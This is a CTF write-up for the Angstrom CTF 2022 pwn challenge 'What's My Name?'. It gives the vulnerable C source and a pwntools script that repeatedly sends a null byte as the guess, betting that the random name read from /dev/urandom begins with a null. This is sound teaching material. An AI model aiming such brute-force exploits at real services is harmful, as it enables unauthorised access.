---
name: What's My Name? (2022)
event: Angstrom CTF 2022
category: Pwn
description: Writeup for What's My Name? (Pwn) - Angstrom CTF (2022) 💜
layout:
    title:
        visible: true
    description:
        visible: true
    tableOfContents:
        visible: true
    outline:
        visible: true
    pagination:
        visible: true
---

# What's My Name?

## Video Walkthrough

[![VIDEO](https://img.youtube.com/vi/YmJoeoXilac/0.jpg)](https://youtu.be/YmJoeoXilac?t=2420 "Angstrom CTF 2022: What's My Name?")

## Description

> Can you guess my name?

## Source

{% code overflow="wrap" %}
```c
#include <stdio.h>
#include <string.h>
#include <stdlib.h>

static void generate_name(char *str)
{
    FILE *file = fopen("/dev/urandom","r");
	fgets(str, 48, file);
	fclose(file);
}

int main(){
    char yourName[48];
    char myName[48];

    char guess[48];

    setbuf(stdout, NULL);

    generate_name(myName);

    printf("Hi! What's your name? ");

    int n = read(0, yourName, 48);
    if (yourName[n-1] == '\n') yourName[n-1] = '\x00';

    printf("Nice to meet you, %s!\n", yourName);

    puts("Guess my name and you'll get a flag!");

    scanf("%48s[^\n]", guess);

    if (strncmp(myName, guess, 48) == 0){
        char flag[128];

		FILE *file = fopen("flag.txt","r");
		if (!file) {
		    puts("Error: missing flag.txt.");
		    exit(1);
		}

		fgets(flag, 128, file);
		puts(flag);
    }

    puts("Bye!");
    return 0;
}
```
{% endcode %}

## Solution

{% code overflow="wrap" %}
```py
from pwn import *

def start(argv=[], *a, **kw):
    if args.GDB:  # Set GDBscript below
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:  # ('server', 'port')
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:  # Run locally
        return process([exe] + argv, *a, **kw)

# Specify your GDB script here for debugging
gdbscript = '''
init-pwndbg
continue
'''.format(**locals())

# Set up pwntools for the correct architecture
exe = './whatsmyname'
# This will automatically get context arch, bits, os etc
elf = context.binary = ELF(exe, checksec=False)
# Enable verbose logging so we can see exactly what is being sent (info/debug)
context.log_level = 'warn'

# ===========================================================
#                    EXPLOIT GOES HERE
# ===========================================================

# Run program 1000 times (hoping for null byte)
for i in range(1000):
    io = start()
    io.sendlineafter(b'name?', b'crypto')  # Any username
    io.sendlineafter(b'flag!', b'\x00')  # Null byte as password
    io.recvline()
    response = io.recv()
    # Did we get the flag?
    if(b'actf' in response):
        warn(response.decode())
        exit(0)
    io.close()
```
{% endcode %}
